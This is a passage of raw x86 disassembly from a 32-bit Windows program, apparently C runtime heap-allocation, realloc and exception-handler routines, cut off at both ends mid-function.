  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
